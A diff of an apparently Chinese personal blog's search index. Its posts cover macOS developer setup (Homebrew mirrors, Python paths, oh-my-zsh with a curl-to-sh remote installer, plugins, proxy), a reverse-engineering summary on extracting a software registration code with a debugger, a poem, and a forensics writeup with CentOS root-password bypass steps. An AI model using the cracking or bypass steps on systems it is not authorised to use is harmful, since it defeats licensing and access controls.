--repo)/Library/Taps/&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> homebrew &amp;&amp; <span class="keyword">cd</span> homebrew</span><br><span class="line">git clone gi<span class="variable">t:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/homebrew-core.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">打开新的终端：</span><br><span class="line">brew doctor</span><br></pre></td></tr></table></figure>
 
 <p>常用的Brew的一些命令：</p>
-<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">brew install &lt;package name&gt; <span class="regexp">//</span>安装一个包</span><br><span class="line">brew upgrate &lt;package name&gt; <span class="regexp">//</span>更新一个包</span><br><span class="line">brew update <span class="regexp">//</span>更新 Homebrew 在服务器端上的包目录</span><br><span class="line">brew upgrade <span class="regexp">//</span>以本地目录更新本地的包</span><br><span class="line">brew list --versions <span class="regexp">//</span>查看安装过的包版本</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">brew install &lt;package name&gt; <span class="regexp">//</span>安装一个包</span><br><span class="line">brew upgrate &lt;package name&gt; <span class="regexp">//</span>更新一个包</span><br><span class="line">brew update <span class="regexp">//</span>更新 Homebrew 在服务器端上的包目录</span><br><span class="line">brew upgrade <span class="regexp">//</span>以本地目录更新本地的包</span><br><span class="line">brew list --versions <span class="regexp">//</span>查看安装过的包版本</span><br></pre></td></tr></table></figure>
 
 <h3 id="Brew-cask"><a href="#Brew-cask" class="headerlink" title="Brew_cask"></a>Brew_cask</h3><p>brew 装的主要是 command line tool。<br>brew cask装的大多是有gui界面的app以及驱动，brew cask是brew的一个官方源。<br>brew cask 是 已经编译好了的应用包 （.dmg/.pkg），仅仅是下载解压，放在统一的目录中（/opt/homebrew-cask/Caskroom）</p>
 <p>brew_cask 原理：<br>之前，是用软链接的方式将应用链接到 Application 文件夹，有人说这样的方式会导致 Spotlight 无法检索到。但现在，它是将应用直接移动到 Application 文件夹，这与我们自己去官网下载应用再安装是完全一致的，后续更新或卸载也按平常的方式即可。</p>
@@ -40,40 +146,22 @@
 <p>二者并无竞争关系，所以也不存在你说的更推荐brew cask。brew装的东西比较偏向开发，而brew cask装的东西会相对生活化一些。</p>
 <p>大体安装步骤是：xcode—homebrew—homebrew cask</p>
 <p>接下来安装Brew_cask:</p>
-<figure class="highlight dsconfig"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">brew </span><span class="string">tap </span><span class="string">homebrew/</span><span class="string">cask-cask </span> // 添加 <span class="string">Github </span>上的 <span class="string">caskroom/</span><span class="string">cask </span>库</span><br><span class="line"><span class="string">brew </span><span class="string">install </span><span class="string">brew-cask </span> // 安装 <span class="string">brew-cask</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如</span>果遇到卡在克隆界面：</span><br><span class="line"></span><br><span class="line"><span class="string">cd </span><span class="string">"$(brew --repo)/Library/Taps/"</span></span><br><span class="line"><span class="string">cd </span><span class="string">homebrew</span></span><br><span class="line"><span class="string">git </span><span class="string">clone </span><span class="string">https:</span>//<span class="string">mirrors.</span><span class="string">ustc.</span><span class="string">edu.</span><span class="string">cn/</span><span class="string">homebrew-cask.</span><span class="string">git</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">brew </span><span class="string">update </span>&amp;&amp; <span class="string">brew </span><span class="string">upgrade </span><span class="string">brew-cask </span>&amp;&amp; <span class="string">brew </span><span class="string">cleanup </span>// 更新</span><br><span class="line"></span><br><span class="line">更换中科大源：</span><br><span class="line"></span><br><span class="line"><span class="string">git </span>-C <span class="string">"$(brew --repo)"</span> <span class="string">remote </span><span class="built_in">set-url</span> <span class="string">origin </span><span class="string">https:</span>//<span class="string">mirrors.</span><span class="string">ustc.</span><span class="string">edu.</span><span class="string">cn/</span><span class="string">brew.</span><span class="string">git</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">git </span>-C <span class="string">"$(brew --repo homebrew/core)"</span> <span class="string">remote </span><span class="built_in">set-url</span> <span class="string">origin </span><span class="string">https:</span>//<span class="string">mirrors.</span><span class="string">ustc.</span><span class="string">edu.</span><span class="string">cn/</span><span class="string">homebrew-core.</span><span class="string">git</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">git </span>-C <span class="string">"$(brew --repo homebrew/cask)"</span> <span class="string">remote </span><span class="built_in">set-url</span> <span class="string">origin </span><span class="string">https:</span>//<span class="string">mirrors.</span><span class="string">ustc.</span><span class="string">edu.</span><span class="string">cn/</span><span class="string">homebrew-cask.</span><span class="string">git</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">brew </span><span class="string">update</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">brew </span><span class="string">tap </span><span class="string">homebrew/</span><span class="string">cask-cask </span> // 添加 <span class="string">Github </span>上的 <span class="string">caskroom/</span><span class="string">cask </span>库</span><br><span class="line"><span class="string">brew </span><span class="string">install </span><span class="string">brew-cask </span> // 安装 <span class="string">brew-cask</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如</span>果遇到卡在克隆界面：</span><br><span class="line"></span><br><span class="line"><span class="string">cd </span><span class="string">&quot;$(brew --repo)/Library/Taps/&quot;</span></span><br><span class="line"><span class="string">cd </span><span class="string">homebrew</span></span><br><span class="line"><span class="string">git </span><span class="string">clone </span><span class="string">https:</span>//<span class="string">mirrors.</span><span class="string">ustc.</span><span class="string">edu.</span><span class="string">cn/</span><span class="string">homebrew-cask.</span><span class="string">git</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">brew </span><span class="string">update </span>&amp;&amp; <span class="string">brew </span><span class="string">upgrade </span><span class="string">brew-cask </span>&amp;&amp; <span class="string">brew </span><span class="string">cleanup </span>// 更新</span><br><span class="line"></span><br><span class="line">更换中科大源：</span><br><span class="line"></span><br><span class="line"><span class="string">git </span>-C <span class="string">&quot;$(brew --repo)&quot;</span> <span class="string">remote </span><span class="built_in">set-url</span> <span class="string">origin </span><span class="string">https:</span>//<span class="string">mirrors.</span><span class="string">ustc.</span><span class="string">edu.</span><span class="string">cn/</span><span class="string">brew.</span><span class="string">git</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">git </span>-C <span class="string">&quot;$(brew --repo homebrew/core)&quot;</span> <span class="string">remote </span><span class="built_in">set-url</span> <span class="string">origin </span><span class="string">https:</span>//<span class="string">mirrors.</span><span class="string">ustc.</span><span class="string">edu.</span><span class="string">cn/</span><span class="string">homebrew-core.</span><span class="string">git</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">git </span>-C <span class="string">&quot;$(brew --repo homebrew/cask)&quot;</span> <span class="string">remote </span><span class="built_in">set-url</span> <span class="string">origin </span><span class="string">https:</span>//<span class="string">mirrors.</span><span class="string">ustc.</span><span class="string">edu.</span><span class="string">cn/</span><span class="string">homebrew-cask.</span><span class="string">git</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">brew </span><span class="string">update</span></span><br></pre></td></tr></table></figure>
 
 
-<h3 id="Python3"><a href="#Python3" class="headerlink" title="Python3"></a>Python3</h3><figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">brew install python</span><br><span class="line"></span><br><span class="line">根据安装路径的一些问题：</span><br><span class="line"></span><br><span class="line">配置   ~/.bash_profile</span><br><span class="line"></span><br><span class="line">➜  ~ cat ~/.bash_profile</span><br><span class="line"><span class="comment"># Setup System PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 2.7</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">"/System/Library/Frameworks/Python.framework/Versions/2.7/bin:<span class="variable">$PATH</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pip</span></span><br><span class="line"><span class="comment"># /usr/local/bin/目录下的pip指向Python2.7，所以不修改系统路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3.8</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">"/usr/local/Cellar/python@3.8/3.8.5/bin:<span class="variable">$PATH</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pip3</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">"/usr/local/Cellar/python@3.8/3.8.5/bin:<span class="variable">$PATH</span>"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Alias Command</span></span><br><span class="line"></span><br><span class="line">alias <span class="attribute">python</span>=<span class="string">'python2'</span></span><br><span class="line">alias <span class="attribute">python3</span>=<span class="string">'python3.8'</span></span><br><span class="line">alias <span class="attribute">python2</span>=<span class="string">'python2'</span></span><br><span class="line">alias <span class="attribute">subl</span>=<span class="string">"'/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl'"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">删除 /usr/local/bin/目录下的pip3 和 pip3.8   因为该目录下的这三个pip全部指向的是：python2的 pip。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看Python的安装路径：</span><br><span class="line"></span><br><span class="line">which Python</span><br><span class="line">which python2</span><br><span class="line">which python3</span><br><span class="line"></span><br><span class="line">调用python的时候默认使用的￥PATH中的从左到右的顺序调用。</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Python3"><a href="#Python3" class="headerlink" title="Python3"></a>Python3</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">brew install python</span><br><span class="line"></span><br><span class="line">根据安装路径的一些问题：</span><br><span class="line"></span><br><span class="line">配置   ~/.bash_profile</span><br><span class="line"></span><br><span class="line">➜  ~ cat ~/.bash_profile</span><br><span class="line"><span class="comment"># Setup System PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 2.7</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">&quot;/System/Library/Frameworks/Python.framework/Versions/2.7/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pip</span></span><br><span class="line"><span class="comment"># /usr/local/bin/目录下的pip指向Python2.7，所以不修改系统路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3.8</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">&quot;/usr/local/Cellar/python@3.8/3.8.5/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pip3</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">&quot;/usr/local/Cellar/python@3.8/3.8.5/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Alias Command</span></span><br><span class="line"></span><br><span class="line">alias <span class="attribute">python</span>=<span class="string">&#x27;python2&#x27;</span></span><br><span class="line">alias <span class="attribute">python3</span>=<span class="string">&#x27;python3.8&#x27;</span></span><br><span class="line">alias <span class="attribute">python2</span>=<span class="string">&#x27;python2&#x27;</span></span><br><span class="line">alias <span class="attribute">subl</span>=<span class="string">&quot;&#x27;/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">删除 /usr/local/bin/目录下的pip3 和 pip3.8   因为该目录下的这三个pip全部指向的是：python2的 pip。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看Python的安装路径：</span><br><span class="line"></span><br><span class="line">which Python</span><br><span class="line">which python2</span><br><span class="line">which python3</span><br><span class="line"></span><br><span class="line">调用python的时候默认使用的￥PATH中的从左到右的顺序调用。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h3 id="on-my-zsh的安装"><a href="#on-my-zsh的安装" class="headerlink" title="on_my_zsh的安装"></a>on_my_zsh的安装</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">参考官方网站的安装方式：</span><br><span class="line"></span><br><span class="line"><span class="comment"># curl</span></span><br><span class="line">sh -c <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wegt </span></span><br><span class="line">sh -c <span class="string">"$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)"</span></span><br><span class="line"></span><br><span class="line">重启终端，查看当前终端：</span><br><span class="line">echo <span class="variable">$SHELL</span></span><br><span class="line">查看已有终端：</span><br><span class="line">cat <span class="regexp">/etc/</span>shell</span><br><span class="line">更换终端：</span><br><span class="line">chsh -s <span class="regexp">/bin/</span>zsh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">主题的更换：</span><br><span class="line">查看自带主题：</span><br><span class="line">ls .oh-my-zsh/themes</span><br><span class="line">这里选择的是自带的默认主题，因为这个最好看。。。。</span><br><span class="line"></span><br><span class="line">常用的插件安装：</span><br><span class="line"></span><br><span class="line">incr:</span><br><span class="line">自动补全命令</span><br><span class="line">wget http:<span class="regexp">//mim</span>osa-pudica.net<span class="regexp">/src/i</span>ncr-<span class="number">0.2</span>.zsh</span><br><span class="line">mkdir ~<span class="regexp">/.oh-my-zsh/</span>plugins/incr</span><br><span class="line">mv incr-<span class="number">0.2</span>.zsh ~<span class="regexp">/.oh-my-zsh/</span>plugins/incr</span><br><span class="line">echo <span class="string">'source ~/.oh-my-zsh/plugins/incr/incr*.zsh'</span> &gt;&gt; ~/.zshrc</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zsh-autosuggestions：</span><br><span class="line">根据历史命令自动补全插件</span><br><span class="line"></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/zsh-users/</span>zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span><span class="regexp">/plugins/</span>zsh-autosuggestions</span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="comment"># 加入插件列表</span></span><br><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  zsh-autosuggestions</span><br><span class="line">)</span><br><span class="line">执行：</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line">autojump:</span><br><span class="line">目录跳转插件：</span><br><span class="line"></span><br><span class="line">brew install autojump</span><br><span class="line">echo <span class="string">'[[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.sh'</span> &gt;&gt; ~/.zshrc</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line">例如：jo te <span class="regexp">//</span>打开Finder</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zsh-syntax-highlighting</span><br><span class="line">可执行代码自动高亮：主要用于提高颜值</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/zsh-users/</span>zsh-syntax-highlighting.git <span class="variable">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span><span class="regexp">/plugins/</span>zsh-syntax-highlighting</span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="comment"># 加入插件列表</span></span><br><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  zsh-autosuggestions</span><br><span class="line">  zsh-syntax-highlighting</span><br><span class="line">)</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="on-my-zsh的安装"><a href="#on-my-zsh的安装" class="headerlink" title="on_my_zsh的安装"></a>on_my_zsh的安装</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">参考官方网站的安装方式：</span><br><span class="line"></span><br><span class="line"><span class="comment"># curl</span></span><br><span class="line">sh -c <span class="string">&quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wegt </span></span><br><span class="line">sh -c <span class="string">&quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;</span></span><br><span class="line"></span><br><span class="line">重启终端，查看当前终端：</span><br><span class="line">echo <span class="variable">$SHELL</span></span><br><span class="line">查看已有终端：</span><br><span class="line">cat <span class="regexp">/etc/</span>shell</span><br><span class="line">更换终端：</span><br><span class="line">chsh -s <span class="regexp">/bin/</span>zsh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">主题的更换：</span><br><span class="line">查看自带主题：</span><br><span class="line">ls .oh-my-zsh/themes</span><br><span class="line">这里选择的是自带的默认主题，因为这个最好看。。。。</span><br><span class="line"></span><br><span class="line">常用的插件安装：</span><br><span class="line"></span><br><span class="line">incr:</span><br><span class="line">自动补全命令</span><br><span class="line">wget http:<span class="regexp">//mim</span>osa-pudica.net<span class="regexp">/src/i</span>ncr-<span class="number">0.2</span>.zsh</span><br><span class="line">mkdir ~<span class="regexp">/.oh-my-zsh/</span>plugins/incr</span><br><span class="line">mv incr-<span class="number">0.2</span>.zsh ~<span class="regexp">/.oh-my-zsh/</span>plugins/incr</span><br><span class="line">echo <span class="string">&#x27;source ~/.oh-my-zsh/plugins/incr/incr*.zsh&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zsh-autosuggestions：</span><br><span class="line">根据历史命令自动补全插件</span><br><span class="line"></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/zsh-users/</span>zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span><span class="regexp">/plugins/</span>zsh-autosuggestions</span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="comment"># 加入插件列表</span></span><br><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  zsh-autosuggestions</span><br><span class="line">)</span><br><span class="line">执行：</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line">autojump:</span><br><span class="line">目录跳转插件：</span><br><span class="line"></span><br><span class="line">brew install autojump</span><br><span class="line">echo <span class="string">&#x27;[[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.sh&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line">例如：jo te <span class="regexp">//</span>打开Finder</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zsh-syntax-highlighting</span><br><span class="line">可执行代码自动高亮：主要用于提高颜值</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/zsh-users/</span>zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span><span class="regexp">/plugins/</span>zsh-syntax-highlighting</span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="comment"># 加入插件列表</span></span><br><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  zsh-autosuggestions</span><br><span class="line">  zsh-syntax-highlighting</span><br><span class="line">)</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 <h3 id="Home-brew-走代理："><a href="#Home-brew-走代理：" class="headerlink" title="Home_brew 走代理："></a>Home_brew 走代理：</h3><p>在  ~/.zshrc  里面添加：</p>
-<figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># where proxy</span></span><br><span class="line">proxy () {</span><br><span class="line">  <span class="builtin-name">export</span> <span class="attribute">all_proxy</span>=socks5://localhost:port</span><br><span class="line">  echo <span class="string">"HTTP Proxy on"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># where noproxy</span></span><br><span class="line">noproxy () {</span><br><span class="line">  unset all_proxy</span><br><span class="line">  echo <span class="string">"HTTP Proxy off"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">执行；</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line">测试：</span><br><span class="line">curl cip.cc</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># where proxy</span></span><br><span class="line">proxy () &#123;</span><br><span class="line">  <span class="builtin-name">export</span> <span class="attribute">all_proxy</span>=socks5://localhost:port</span><br><span class="line">  echo <span class="string">&quot;HTTP Proxy on&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># where noproxy</span></span><br><span class="line">noproxy () &#123;</span><br><span class="line">  unset all_proxy</span><br><span class="line">  echo <span class="string">&quot;HTTP Proxy off&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">执行；</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line">测试：</span><br><span class="line">curl cip.cc</span><br></pre></td></tr></table></figure>
 
 
 
 <h3 id="Sublime-Text3-插件："><a href="#Sublime-Text3-插件：" class="headerlink" title="Sublime Text3 插件："></a>Sublime Text3 插件：</h3><p>安装过程不言，插件列表如下：</p>
-<figure class="highlight mipsasm"><table><tbody><tr><td class="code"><pre><span class="line">AutoFileName</span><br><span class="line"><span class="keyword">JsFormat</span></span><br><span class="line"><span class="keyword">SublimeCodeIntel</span></span><br><span class="line"><span class="keyword">ConvertToUTF8</span></span><br><span class="line"><span class="keyword">BracketHighlight</span></span><br><span class="line"><span class="keyword">markdown </span>preview</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">AutoFileName</span><br><span class="line"><span class="keyword">JsFormat</span></span><br><span class="line"><span class="keyword">SublimeCodeIntel</span></span><br><span class="line"><span class="keyword">ConvertToUTF8</span></span><br><span class="line"><span class="keyword">BracketHighlight</span></span><br><span class="line"><span class="keyword">markdown </span>preview</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
       <categories>
         <category>学习</category>
       </categories>
@@ -127,25 +215,7 @@
 <p>这个注册码就是对应我们用户名正确的注册码了，记录下来，等会进入软件进行注册。<br>程序后面就是进行注册码的对比了，会有关键CALL和关键跳，但是程序加了壳，我们无法保存修改，所以暂时不用这种方法，（加壳程序可以通过打补丁的方式爆破），我们使用正确的注册码使用软件。<br>关闭OD，使用之前的用户名和现在正确的注册码进行注册：</p>
 <p><img src="/images/pasted-100.png" alt="upload successful"></p>
 <p>总结：<br>1.很多软件都会加壳，使用PEiD v0.98进行查壳；<br>2.软件未脱壳的情况下，需要先F9运行软件，让加壳的程序解码之后，才能做后面的下断点，动态调试之类操作；<br>3.很多软件都使用重启验证的方式，这些信息一般会存在软件的安装目录的配置文件中或者是注册表中；<br>4.找到读取注册表或者配置文件的代码段，单步执行，注意观察CPU寄存器窗口和堆栈窗口，软件会根据用户名生成正确的注册码，注意多单步运行几次，记录下所有敏感的字符串。</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+]]></content>
       <categories>
         <category>逆向</category>
       </categories>
@@ -165,25 +235,7 @@
 <p>记得旧时淘，总嫌先生讲乖巧，车马混鱼龙，睁眼乐妖娆，而今人长大，心思飘成草；</p>
 <p>记得旧时闹，偏要哥哥教捉虾，墙角挖青苔，梢头斗知了，而今人长大，心湖荡起潮；</p>
 <p>想如今，天高海阔音信杳杳，沧桑岁月间抹不平凄凉寂寥。</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+]]></content>
       <categories>
         <category>那些花儿</category>
       </categories>
@@ -199,13 +251,13 @@
 <h3 id="检材："><a href="#检材：" class="headerlink" title="检材："></a>检材：</h3><h5 id="Centos7-64位的虚拟机文件一份"><a href="#Centos7-64位的虚拟机文件一份" class="headerlink" title="Centos7 64位的虚拟机文件一份"></a>Centos7 64位的虚拟机文件一份</h5><p>很惊喜地发现有一份快照（比武起点）</p>
 <h5 id="犯罪嫌疑人笔记本电脑E01镜像一份"><a href="#犯罪嫌疑人笔记本电脑E01镜像一份" class="headerlink" title="犯罪嫌疑人笔记本电脑E01镜像一份"></a>犯罪嫌疑人笔记本电脑E01镜像一份</h5><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h5 id="1-分别列出服务器的系统类型，版本号，定时任务情况；（5分）"><a href="#1-分别列出服务器的系统类型，版本号，定时任务情况；（5分）" class="headerlink" title="1.分别列出服务器的系统类型，版本号，定时任务情况；（5分）"></a>1.分别列出服务器的系统类型，版本号，定时任务情况；（5分）</h5><p>打开虚拟机发现需要密码，直接绕掉</p>
 <p>顺便记录一下Centos6和Centos7的密码绕过方法：</p>
-<h6 id="Centos6密码绕过"><a href="#Centos6密码绕过" class="headerlink" title="Centos6密码绕过"></a>Centos6密码绕过</h6><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">启动时任意键暂停启动&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">按a键进入编辑模式 </span><br><span class="line">按S键进入单用户模式</span><br><span class="line">passwd root</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">reboot</span><br></pre></td></tr></tbody></table></figure>
+<h6 id="Centos6密码绕过"><a href="#Centos6密码绕过" class="headerlink" title="Centos6密码绕过"></a>Centos6密码绕过</h6><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">启动时任意键暂停启动        </span><br><span class="line">按a键进入编辑模式 </span><br><span class="line">按S键进入单用户模式</span><br><span class="line">passwd root</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
 
-<h6 id="Centos7密码绕过"><a href="#Centos7密码绕过" class="headerlink" title="Centos7密码绕过"></a>Centos7密码绕过</h6><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">方法一：</span><br><span class="line"></span><br><span class="line">启动时任意键暂停启动&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">按e键进入编辑模式&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">将光标移动到linux16开始的行，将ro改为rw init=<span class="regexp">/sysroot/</span>bin/sh&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">按Ctrl-x启动&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">chroot /sysroot&nbsp;</span><br><span class="line">LANG=en（如果出现乱码）</span><br><span class="line">passwd root&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">touch /.autorelabel&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; <span class="comment"># (如果你系统没有开启selinux，那么可以不做这一步)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span></span><br><span class="line"><span class="keyword">exit</span>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">reboot&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line"></span><br><span class="line">启动时任意键暂停启动</span><br><span class="line">按e键进入编辑模式</span><br><span class="line">将光标移动到linux16开始的行，添加内核参数rd.<span class="keyword">break</span></span><br><span class="line">按Ctrl-x启动</span><br><span class="line">mount -o remount,rw /sysroot</span><br><span class="line">chroot /sysroot</span><br><span class="line">LANG=en（如果出现乱码）</span><br><span class="line">passwd root</span><br><span class="line">touch /.autorelabel</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">reboot&nbsp;</span><br></pre></td></tr></tbody></table></figure>
